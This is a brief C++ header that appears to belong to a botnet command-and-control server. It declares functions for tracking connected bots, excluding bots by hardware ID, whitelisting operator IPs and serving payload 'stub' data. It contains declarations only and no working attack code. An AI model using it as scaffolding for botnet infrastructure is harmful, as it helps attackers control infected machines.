#pragma once
#include "client.h"
#include <map>
typedef std::map<unsigned short, client*> bot_list_t;
typedef std::vector<unsigned long long> excluded_bot_list_t;
bool is_authorized_ip(u_long ip);
void authorize_ip(u_long ip);
void get_authorized_ips(std::set<u_long>* out_ips);
void load_stub_data();
std::vector<char> get_stub_data(std::vector<char>* out_data);
void get_bot_list(bot_list_t* out_bot_list);
void erase_bot_from_bot_list(client* bot);
void remove_excluded_bot(unsigned long long hwid);
void add_excluded_bot(unsigned long long hwid);
void get_excluded_bots(excluded_bot_list_t& list);
void init_excluded_bots();